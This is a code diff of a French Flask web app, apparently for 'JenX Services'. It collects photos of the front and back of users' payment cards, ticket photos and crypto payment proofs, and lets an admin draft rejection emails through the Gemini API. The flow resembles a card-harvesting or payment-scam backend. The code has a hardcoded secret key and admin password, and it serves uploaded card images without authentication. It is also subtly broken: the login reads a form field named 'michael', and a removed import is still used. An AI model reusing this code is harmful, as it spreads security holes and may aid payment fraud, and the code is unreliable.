@@ -1,9 +1,10 @@
 # app.py
-from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, session
+from flask import Flask, render_template, request, redirect, url_for, jsonify, session
 import os
 import json
 import uuid
 import datetime
+import requests
 
 app = Flask(__name__)
 # Une clé secrète est nécessaire pour les sessions Flask.
@@ -11,9 +12,12 @@ app = Flask(__name__)
 app.secret_key = 'votre_cle_secrete_tres_securisee_ici'
 
 # Chemins pour le stockage des données et des uploads
-UPLOAD_FOLDER = 'uploads'
-DATA_FOLDER = 'data'
-RECEIPTS_FOLDER = 'receipts'
+# Correction pour le déploiement : utiliser des chemins absolus
+BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
+DATA_FOLDER = os.path.join(BASE_DIR, 'data')
+RECEIPTS_FOLDER = os.path.join(BASE_DIR, 'receipts')
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 # Créer les dossiers si ils n'existent pas
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
@@ -22,6 +26,10 @@ os.makedirs(RECEIPTS_FOLDER, exist_ok=True)
 
 # Chemin du fichier JSON pour les utilisateurs
 USERS_FILE = os.path.join(DATA_FOLDER, 'users.json')
+
+# Clé API Gemini (laissez vide, elle sera fournie par l'environnement Canvas)
+GEMINI_API_KEY = ""
+GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"
 
 def load_users():
     """Charge les données des utilisateurs depuis le fichier JSON."""
@@ -179,13 +187,13 @@ def upload_card_details():
 
     if recto_file and recto_file.filename != '':
         filename_recto = f"{user_id}_card_recto_{uuid.uuid4().hex[:8]}{os.path.splitext(recto_file.filename)[1]}"
-        filepath_recto = os.path.join(UPLOAD_FOLDER, filename_recto)
+        filepath_recto = os.path.join(app.config['UPLOAD_FOLDER'], filename_recto)
         recto_file.save(filepath_recto)
         card_data['recto_photo'] = filename_recto
 
     if verso_file and verso_file.filename != '':
         filename_verso = f"{user_id}_card_verso_{uuid.uuid4().hex[:8]}{os.path.splitext(verso_file.filename)[1]}"
-        filepath_verso = os.path.join(UPLOAD_FOLDER, filename_verso)
+        filepath_verso = os.path.join(app.config['UPLOAD_FOLDER'], filename_verso)
         verso_file.save(filepath_verso)
         card_data['verso_photo'] = filename_verso
 
@@ -228,7 +236,7 @@ def upload_ticket_details():
     ticket_photo_filename = None
     if ticket_file and ticket_file.filename != '':
         ticket_photo_filename = f"{user_id}_ticket_{uuid.uuid4().hex[:8]}{os.path.splitext(ticket_file.filename)[1]}"
-        filepath_ticket = os.path.join(UPLOAD_FOLDER, ticket_photo_filename)
+        filepath_ticket = os.path.join(app.config['UPLOAD_FOLDER'], ticket_photo_filename)
         ticket_file.save(filepath_ticket)
 
     # Récupère les données du formulaire
@@ -311,13 +319,13 @@ def submit_complementary_payment():
 
         if recto_file and recto_file.filename != '':
             filename_recto = f"{user_id}_comp_card_recto_{uuid.uuid4().hex[:8]}{os.path.splitext(recto_file.filename)[1]}"
-            filepath_recto = os.path.join(UPLOAD_FOLDER, filename_recto)
+            filepath_recto = os.path.join(app.config['UPLOAD_FOLDER'], filename_recto)
             recto_file.save(filepath_recto)
             complementary_data['recto_photo'] = filename_recto
 
         if verso_file and verso_file.filename != '':
             filename_verso = f"{user_id}_comp_card_verso_{uuid.uuid4().hex[:8]}{os.path.splitext(verso_file.filename)[1]}"
-            filepath_verso = os.path.join(UPLOAD_FOLDER, filename_verso)
+            filepath_verso = os.path.join(app.config['UPLOAD_FOLDER'], filename_verso)
             verso_file.save(filepath_verso)
             complementary_data['verso_photo'] = filename_verso
 
@@ -326,7 +334,7 @@ def submit_complementary_payment():
         ticket_photo_filename = None
         if ticket_file and ticket_file.filename != '':
             ticket_photo_filename = f"{user_id}_comp_ticket_{uuid.uuid4().hex[:8]}{os.path.splitext(ticket_file.filename)[1]}"
-            filepath_ticket = os.path.join(UPLOAD_FOLDER, ticket_photo_filename)
+            filepath_ticket = os.path.join(app.config['UPLOAD_FOLDER'], ticket_photo_filename)
             ticket_file.save(filepath_ticket)
 
         complementary_data = {
@@ -433,7 +441,7 @@ def submit_crypto_payment():
     crypto_proof_filename = None
     if crypto_proof_file and crypto_proof_file.filename != '':
         crypto_proof_filename = f"{user_id}_crypto_proof_{uuid.uuid4().hex[:8]}{os.path.splitext(crypto_proof_file.filename)[1]}"
-        filepath_crypto_proof = os.path.join(UPLOAD_FOLDER, crypto_proof_filename)
+        filepath_crypto_proof = os.path.join(app.config['UPLOAD_FOLDER'], crypto_proof_filename)
         crypto_proof_file.save(filepath_crypto_proof)
     
     users[user_id]['crypto_payment_proof'] = crypto_proof_filename
@@ -476,7 +484,7 @@ def submit_final_validation():
     final_photo_filename = None
     if final_photo_file and final_photo_file.filename != '':
         final_photo_filename = f"{user_id}_final_photo_{uuid.uuid4().hex[:8]}{os.path.splitext(final_photo_file.filename)[1]}"
-        filepath_final_photo = os.path.join(UPLOAD_FOLDER, final_photo_filename)
+        filepath_final_photo = os.path.join(app.config['UPLOAD_FOLDER'], final_photo_filename)
         final_photo_file.save(filepath_final_photo)
 
     final_validation_data = {
@@ -503,7 +511,7 @@ def submit_final_validation():
 @app.route('/uploads/<filename>')
 def uploaded_file(filename):
     """Permet d'accéder aux fichiers uploadés."""
-    return send_from_directory(UPLOAD_FOLDER, filename)
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
 # --- Interface Admin ---
 
@@ -511,10 +519,10 @@ def uploaded_file(filename):
 def admin_login():
     """Page de connexion de l'admin."""
     if request.method == 'POST':
-        username = request.form.get('username')
-        password = request.form.get('password')
+        username = request.form.get('michael')
+        password = request.form.get('michael')
         # Simple vérification pour l'exemple. En production, utilisez des identifiants sécurisés.
-        if username == 'michael' and password == 'michael': 
+        if username == 'admin' and password == 'adminpass': 
             session['admin_logged_in'] = True
             return redirect(url_for('admin_dashboard'))
         else:
@@ -585,13 +593,7 @@ def admin_update_user_status(user_id):
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
 
-    # Récupère l'user_id du chemin URL et aussi du formulaire (pour robustesse)
-    user_id_from_route = user_id
-    # Note: Le champ caché 'user_id_from_form' n'est plus nécessaire si l'URL est bien formée.
-    # Cependant, le laisser ne nuit pas à la robustesse.
-    # user_id_from_form = request.form.get('user_id_from_form') 
-
-    target_user_id = user_id_from_route # On se base sur l'ID de l'URL qui est maintenant correct
+    target_user_id = user_id
 
     action = request.form.get('action') # 'validate' ou 'reject'
     users = load_users()
@@ -626,6 +628,63 @@ def admin_update_user_status(user_id):
         save_users(users)
     
     return redirect(url_for('admin_dashboard')) # Redirige vers le tableau de bord après l'action
+
+@app.route('/admin_draft_rejection_message', methods=['POST'])
+def admin_draft_rejection_message():
+    """
+    Génère un brouillon de message de refus en utilisant l'API Gemini.
+    """
+    if not session.get('admin_logged_in'):
+        return jsonify({'error': 'Non autorisé'}), 403
+
+    user_id = request.json.get('user_id')
+    rejection_reason = request.json.get('rejection_reason')
+
+    users = load_users()
+    user_data = users.get(user_id)
+
+    if not user_data:
+        return jsonify({'error': 'Utilisateur non trouvé'}), 404
+
+    user_first_name = user_data.get('first_name', 'utilisateur')
+    user_name = user_data.get('name', '')
+
+    prompt = f"Rédigez un e-mail poli et professionnel à un utilisateur nommé {user_first_name} {user_name} dont la vérification de paiement pour JenX Services a été rejetée. La raison du rejet est : '{rejection_reason}'. Conseillez-lui de se connecter à son compte pour plus de détails ou de contacter le support. Soyez concis et empathique."
+
+    try:
+        payload = {
+            "contents": [{"role": "user", "parts": [{"text": prompt}]}],
+            "generationConfig": {
+                "temperature": 0.7,
+                "topK": 40,
+                "topP": 0.95,
+                "maxOutputTokens": 500,
+            }
+        }
+        headers = {
+            'Content-Type': 'application/json'
+        }
+        
+        # Utiliser une clé API vide, Canvas la gérera
+        api_url_with_key = f"{GEMINI_API_URL}?key="
+        
+        response = requests.post(api_url_with_key, headers=headers, json=payload)
+        response.raise_for_status() # Lève une exception pour les codes d'état HTTP d'erreur
+        
+        result = response.json()
+        
+        if result.get('candidates') and result['candidates'][0].get('content') and result['candidates'][0]['content'].get('parts'):
+            generated_text = result['candidates'][0]['content']['parts'][0]['text']
+            return jsonify({'draft_message': generated_text})
+        else:
+            return jsonify({'error': 'Aucun contenu généré par l\'IA.'}), 500
+
+    except requests.exceptions.RequestException as e:
+        print(f"Erreur lors de l'appel à l'API Gemini: {e}")
+        return jsonify({'error': f"Erreur lors de la génération du message: {e}"}), 500
+    except Exception as e:
+        print(f"Erreur inattendue: {e}")
+        return jsonify({'error': f"Une erreur inattendue est survenue: {e}"}), 500
 
 
 @app.route('/admin_logout')
